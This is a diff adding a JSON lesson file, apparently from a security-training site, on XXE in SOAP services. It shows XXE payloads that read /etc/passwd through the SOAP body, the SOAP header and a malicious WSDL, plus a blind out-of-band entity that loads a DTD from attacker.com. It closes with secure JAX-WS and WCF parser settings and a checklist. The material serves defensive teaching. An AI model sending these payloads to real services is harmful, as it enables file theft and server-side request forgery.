@@ -1,0 +1,97 @@
+{
+  "id": "soap-services",
+  "category": "contexts",
+  "title": "XXE in SOAP Services",
+  "description": "XXE vulnerabilities in SOAP web services, including WSDL parsing, SOAP message processing, and mitigation strategies for JAX-WS and other frameworks.",
+  "severity": "high",
+  "cvssScore": 8.2,
+  "cvssVector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N",
+  "cwe": "CWE-611: Improper Restriction of XML External Entity Reference",
+  "owasp": "OWASP Top 10:2021 - A05: Security Misconfiguration",
+  "sections": [
+    {
+      "id": "overview",
+      "title": "Overview",
+      "type": "text",
+      "content": "SOAP (Simple Object Access Protocol) services are particularly vulnerable to XXE attacks because they rely heavily on XML for message structure and data exchange. Both SOAP request processing and WSDL (Web Services Description Language) parsing can be exploited.\n\n**Why SOAP is Vulnerable:**\n• Every SOAP message is XML\n• WSDL files are XML and often parsed\n• Legacy frameworks with insecure defaults\n• Complex XML schemas and processing\n• Multiple parsing points (envelope, body, attachments)\n\n**Common Attack Vectors:**\n• SOAP message body XXE\n• WSDL file XXE during service discovery\n• SOAP attachments (MTOM/SwA)\n• WS-Security headers\n• Custom SOAP extensions\n\n**Typical Impact:**\n• Internal file disclosure\n• SSRF to internal services\n• Denial of service\n• Authentication bypass (via SSRF)\n• Data exfiltration"
+    },
+    {
+      "id": "soap-structure",
+      "title": "SOAP Message Structure",
+      "type": "code",
+      "code": {
+        "language": "xml",
+        "code": "<!-- Standard SOAP 1.1 Message -->\n<?xml version=\"1.0\"?>\n<soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Header>\n    <!-- Optional header elements -->\n    <Authentication>\n      <Username>user</Username>\n      <Password>pass</Password>\n    </Authentication>\n  </soap:Header>\n  <soap:Body>\n    <!-- Service-specific data -->\n    <GetUserInfo xmlns=\"http://example.com/services\">\n      <UserId>12345</UserId>\n    </GetUserInfo>\n  </soap:Body>\n</soap:Envelope>\n\n<!-- SOAP 1.2 uses different namespace -->\n<?xml version=\"1.0\"?>\n<env:Envelope xmlns:env=\"http://www.w3.org/2003/05/soap-envelope\">\n  <env:Body>\n    <m:GetStockPrice xmlns:m=\"http://example.com/stock\">\n      <m:StockName>IBM</m:StockName>\n    </m:GetStockPrice>\n  </env:Body>\n</env:Envelope>",
+        "isVulnerable": false,
+        "filename": "soap-message.xml"
+      }
+    },
+    {
+      "id": "soap-xxe-attack",
+      "title": "XXE Attack in SOAP Message",
+      "type": "code",
+      "code": {
+        "language": "xml",
+        "code": "<!-- XXE in SOAP Body -->\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <GetUserInfo xmlns=\"http://example.com/services\">\n      <UserId>&xxe;</UserId>\n    </GetUserInfo>\n  </soap:Body>\n</soap:Envelope>\n\n<!-- XXE in SOAP Header -->\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Header>\n    <Authentication>\n      <Username>&xxe;</Username>\n    </Authentication>\n  </soap:Header>\n  <soap:Body>\n    <GetUserInfo xmlns=\"http://example.com/services\">\n      <UserId>123</UserId>\n    </GetUserInfo>\n  </soap:Body>\n</soap:Envelope>\n\n<!-- Blind XXE with OOB -->\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">\n  %xxe;\n]>\n<soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <ProcessData>test</ProcessData>\n  </soap:Body>\n</soap:Envelope>",
+        "isVulnerable": true,
+        "filename": "soap-xxe-attack.xml"
+      }
+    },
+    {
+      "id": "wsdl-xxe",
+      "title": "XXE in WSDL Files",
+      "type": "text",
+      "content": "**WSDL Parsing Vulnerability:**\nWhen a SOAP client parses a WSDL file to discover service endpoints, it can be exploited with XXE if the WSDL parser is vulnerable.\n\n**Attack Scenario:**\n1. Attacker controls or modifies WSDL file\n2. Client application requests WSDL\n3. Attacker serves malicious WSDL with XXE payload\n4. Client's WSDL parser expands entities\n5. Attacker gains file disclosure or SSRF\n\n**Impact:**\n• Client-side attack (affects service consumers)\n• Can target internal networks of clients\n• Often overlooked in security reviews\n• Affects automated service discovery"
+    },
+    {
+      "id": "wsdl-xxe-example",
+      "title": "Malicious WSDL with XXE",
+      "type": "code",
+      "code": {
+        "language": "xml",
+        "code": "<?xml version=\"1.0\"?>\n<!DOCTYPE definitions [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<definitions name=\"StockQuote\"\n             targetNamespace=\"http://example.com/stockquote.wsdl\"\n             xmlns=\"http://schemas.xmlsoap.org/wsdl/\"\n             xmlns:soap=\"http://schemas.xmlsoap.org/wsdl/soap/\">\n  \n  <message name=\"GetQuoteRequest\">\n    <part name=\"symbol\" type=\"xsd:string\"/>\n  </message>\n  \n  <message name=\"GetQuoteResponse\">\n    <!-- XXE payload in documentation or description -->\n    <documentation>&xxe;</documentation>\n    <part name=\"quote\" type=\"xsd:float\"/>\n  </message>\n  \n  <portType name=\"StockQuotePortType\">\n    <operation name=\"GetQuote\">\n      <input message=\"tns:GetQuoteRequest\"/>\n      <output message=\"tns:GetQuoteResponse\"/>\n    </operation>\n  </portType>\n  \n  <binding name=\"StockQuoteSoapBinding\" type=\"tns:StockQuotePortType\">\n    <soap:binding style=\"rpc\" transport=\"http://schemas.xmlsoap.org/soap/http\"/>\n    <operation name=\"GetQuote\">\n      <soap:operation soapAction=\"GetQuote\"/>\n      <input><soap:body use=\"encoded\"/></input>\n      <output><soap:body use=\"encoded\"/></output>\n    </operation>\n  </binding>\n</definitions>",
+        "isVulnerable": true,
+        "filename": "malicious.wsdl"
+      }
+    },
+    {
+      "id": "jax-ws-prevention",
+      "title": "JAX-WS Secure Configuration (Java)",
+      "type": "code",
+      "code": {
+        "language": "java",
+        "code": "import javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.ParserConfigurationException;\nimport javax.xml.ws.Endpoint;\nimport javax.xml.ws.Provider;\nimport javax.xml.ws.Service;\nimport javax.xml.ws.ServiceMode;\nimport javax.xml.ws.WebServiceProvider;\nimport javax.xml.transform.Source;\nimport javax.xml.transform.stream.StreamSource;\nimport java.io.StringReader;\n\n// SECURE: Configure DocumentBuilderFactory for JAX-WS\npublic class SecureSOAPConfig {\n    \n    public static DocumentBuilderFactory createSecureFactory() \n            throws ParserConfigurationException {\n        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n        \n        // Disable external entities\n        factory.setFeature(\n            \"http://apache.org/xml/features/disallow-doctype-decl\",\n            true\n        );\n        factory.setFeature(\n            \"http://xml.org/sax/features/external-general-entities\",\n            false\n        );\n        factory.setFeature(\n            \"http://xml.org/sax/features/external-parameter-entities\",\n            false\n        );\n        factory.setFeature(\n            \"http://apache.org/xml/features/nonvalidating/load-external-dtd\",\n            false\n        );\n        factory.setXIncludeAware(false);\n        factory.setExpandEntityReferences(false);\n        \n        return factory;\n    }\n}\n\n// SECURE: JAX-WS Service Implementation\n@WebService\npublic class SecureStockService {\n    \n    @WebMethod\n    public String getStockPrice(@WebParam(name=\"symbol\") String symbol) {\n        // Input validation\n        if (symbol == null || symbol.isEmpty()) {\n            throw new IllegalArgumentException(\"Symbol required\");\n        }\n        \n        // Validate symbol format (alphanumeric only)\n        if (!symbol.matches(\"^[A-Z]{1,5}$\")) {\n            throw new IllegalArgumentException(\"Invalid symbol format\");\n        }\n        \n        // Process request...\n        return \"100.00\";\n    }\n}\n\n// Configure JAX-WS endpoint with secure parser\npublic class SecureEndpoint {\n    public static void main(String[] args) throws Exception {\n        // Set system property for secure XML processing\n        System.setProperty(\n            \"javax.xml.accessExternalDTD\",\n            \"\" // Disable external DTD access\n        );\n        System.setProperty(\n            \"javax.xml.accessExternalSchema\",\n            \"\" // Disable external schema access\n        );\n        \n        Endpoint.publish(\n            \"http://localhost:8080/stock\",\n            new SecureStockService()\n        );\n    }\n}",
+        "isVulnerable": false,
+        "filename": "SecureSOAPService.java"
+      }
+    },
+    {
+      "id": "dotnet-wcf-prevention",
+      "title": ".NET WCF Secure Configuration",
+      "type": "code",
+      "code": {
+        "language": "csharp",
+        "code": "using System;\nusing System.ServiceModel;\nusing System.Xml;\nusing System.IO;\n\n// SECURE: WCF Service with secure XML processing\n[ServiceContract]\npublic interface IStockService\n{\n    [OperationContract]\n    string GetStockPrice(string symbol);\n}\n\npublic class StockService : IStockService\n{\n    public string GetStockPrice(string symbol)\n    {\n        // Input validation\n        if (string.IsNullOrEmpty(symbol))\n        {\n            throw new ArgumentException(\"Symbol required\");\n        }\n        \n        return \"100.00\";\n    }\n}\n\n// SECURE: Configure WCF with secure XML reader settings\npublic class SecureWCFConfig\n{\n    public static ServiceHost CreateSecureHost()\n    {\n        var host = new ServiceHost(typeof(StockService));\n        \n        // Add endpoint with secure binding\n        var binding = new BasicHttpBinding();\n        binding.ReaderQuotas.MaxDepth = 32;\n        binding.ReaderQuotas.MaxStringContentLength = 8192;\n        binding.ReaderQuotas.MaxArrayLength = 16384;\n        binding.Security.Mode = BasicHttpSecurityMode.Transport;\n        \n        host.AddServiceEndpoint(\n            typeof(IStockService),\n            binding,\n            \"https://localhost:8080/stock\"\n        );\n        \n        return host;\n    }\n    \n    // SECURE: XML reader settings for message inspection\n    public static XmlReaderSettings GetSecureSettings()\n    {\n        return new XmlReaderSettings\n        {\n            DtdProcessing = DtdProcessing.Prohibit, // Critical!\n            XmlResolver = null, // Critical!\n            MaxCharactersFromEntities = 0,\n            MaxCharactersInDocument = 10000000\n        };\n    }\n}\n\n// Custom message inspector for additional validation\npublic class SecureMessageInspector : IDispatchMessageInspector\n{\n    public object AfterReceiveRequest(\n        ref Message request,\n        IClientChannel channel,\n        InstanceContext instanceContext)\n    {\n        // Create message buffer to read without consuming\n        var buffer = request.CreateBufferedCopy(int.MaxValue);\n        var message = buffer.CreateMessage();\n        \n        // Read message body with secure settings\n        using (var reader = message.GetReaderAtBodyContents())\n        {\n            var settings = SecureWCFConfig.GetSecureSettings();\n            using (var secureReader = XmlReader.Create(reader, settings))\n            {\n                // Validate message doesn't contain DOCTYPE\n                var xml = secureReader.ReadOuterXml();\n                if (xml.Contains(\"<!DOCTYPE\"))\n                {\n                    throw new FaultException(\"DOCTYPE not allowed\");\n                }\n            }\n        }\n        \n        // Restore message from buffer\n        request = buffer.CreateMessage();\n        return null;\n    }\n    \n    public void BeforeSendReply(ref Message reply, object correlationState)\n    {\n        // No action needed\n    }\n}",
+        "isVulnerable": false,
+        "filename": "SecureWCFService.cs"
+      }
+    },
+    {
+      "id": "prevention-checklist",
+      "title": "SOAP Service Security Checklist",
+      "type": "text",
+      "content": "☐ **Server-Side Protection (SOAP Endpoint)**\n   • Disable external entity resolution in XML parser\n   • Disable DTD processing completely\n   • Validate all SOAP message content\n   • Implement input size limits\n   • Use secure framework configurations\n\n☐ **Client-Side Protection (SOAP Consumer)**\n   • Secure WSDL parser configuration\n   • Validate WSDL files before parsing\n   • Use HTTPS for WSDL retrieval\n   • Don't parse untrusted WSDL files\n   • Validate service endpoints\n\n☐ **JAX-WS (Java)**\n   • Set javax.xml.accessExternalDTD to empty string\n   • Set javax.xml.accessExternalSchema to empty string\n   • Configure secure DocumentBuilderFactory\n   • Update to latest JAX-WS version\n\n☐ **WCF (.NET)**\n   • Set DtdProcessing.Prohibit\n   • Set XmlResolver to null\n   • Configure ReaderQuotas limits\n   • Use message inspectors for validation\n\n☐ **Apache Axis/Axis2**\n   • Update to latest version\n   • Configure secure XMLInputFactory\n   • Disable DTD processing\n\n☐ **Testing**\n   • Test with XXE payloads in SOAP body\n   • Test with XXE in SOAP headers\n   • Test WSDL parsing with malicious WSDL\n   • Verify entities not expanded\n   • Test with automated tools"
+    }
+  ],
+  "relatedTopics": ["xml-basics", "java-prevention", "dotnet-prevention", "testing-methodology"],
+  "references": [
+    {
+      "title": "OWASP - Web Service Security",
+      "url": "https://owasp.org/www-community/vulnerabilities/Web_Service_Security"
+    },
+    {
+      "title": "W3C SOAP Specification",
+      "url": "https://www.w3.org/TR/soap/"
+    }
+  ]
+}
